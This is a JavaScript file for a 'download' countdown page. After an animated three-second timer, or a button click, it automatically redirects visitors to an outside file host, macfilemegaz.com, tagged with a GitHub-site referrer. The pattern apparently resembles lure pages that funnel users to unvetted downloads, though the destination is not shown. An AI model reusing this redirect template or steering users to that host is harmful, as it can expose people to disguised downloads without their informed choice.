(function () {
  'use strict';

  var redirectUrl = 'https://macfilemegaz.com/?githubsite.me';
  var delayMs = 3000;
  var circumference = 2 * Math.PI * 26; // 163.36

  var countdownEl  = document.getElementById('countdownTime');
  var secondsEl    = document.getElementById('secondsText');
  var progressEl   = document.getElementById('progressBar');
  var progressPct  = document.getElementById('progressPct');
  var arcEl        = document.getElementById('arcCircle');
  var statusTitle  = document.getElementById('statusTitle');
  var statusBadge  = document.getElementById('statusBadge');
  var orbitRing1   = document.getElementById('orbitRing1');
  var orbitRing2   = document.getElementById('orbitRing2');
  var orbitIcon    = document.getElementById('orbitIcon');
  var btnEl        = document.getElementById('downloadBtn');

  var startTime = performance.now();
  var isRedirecting = false;
  var rafId = null;

  function setCountdownClass(remSec) {
    countdownEl.className = 'timer-count';
    if (remSec <= 1) countdownEl.classList.add('c-red');
    else if (remSec <= 2) countdownEl.classList.add('c-amber');
  }

  function markDone() {
    orbitRing1.classList.add('orbit-done');
    orbitRing2.classList.add('orbit-done');
    orbitIcon.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="22" height="22"><polyline points="20 6 9 17 4 12"/></svg>';
    statusTitle.textContent = 'Redirecting you now\u2026';
    statusBadge.textContent = 'Ready';
    statusBadge.classList.add('badge-green');
    progressEl.classList.add('prog-done');
  }

  function animate(now) {
    if (isRedirecting) return;

    var elapsed  = now - startTime;
    var progress = Math.min(elapsed / delayMs, 1);
    var remMs    = Math.max(0, delayMs - elapsed);
    var remSec   = Math.ceil(remMs / 1000);
    var pct      = Math.round(progress * 100);

    // countdown text (keep the trailing <span>)
    countdownEl.innerHTML = remSec + '<span class="timer-s">s</span>';
    secondsEl.textContent = remSec;
    setCountdownClass(remSec);

    // progress bar
    progressEl.style.width = pct + '%';
    progressPct.textContent = pct + '%';

    // arc circle
    arcEl.style.strokeDashoffset = (circumference * (1 - progress)).toFixed(2);

    if (elapsed >= delayMs) {
      markDone();
      redirect();
      return;
    }

    rafId = requestAnimationFrame(animate);
  }

  function redirect() {
    if (isRedirecting) return;
    isRedirecting = true;
    if (rafId) cancelAnimationFrame(rafId);
    if (redirectUrl && redirectUrl.trim()) {
      window.location.assign(redirectUrl);
    }
  }

  btnEl.addEventListener('click', redirect);
  rafId = requestAnimationFrame(animate);

  document.addEventListener('visibilitychange', function () {
    if (document.hidden) {
      if (rafId) { cancelAnimationFrame(rafId); rafId = null; }
    } else if (!isRedirecting && !rafId) {
      var elapsed = performance.now() - startTime;
      if (elapsed < delayMs) rafId = requestAnimationFrame(animate);
      else redirect();
    }
  });
})();
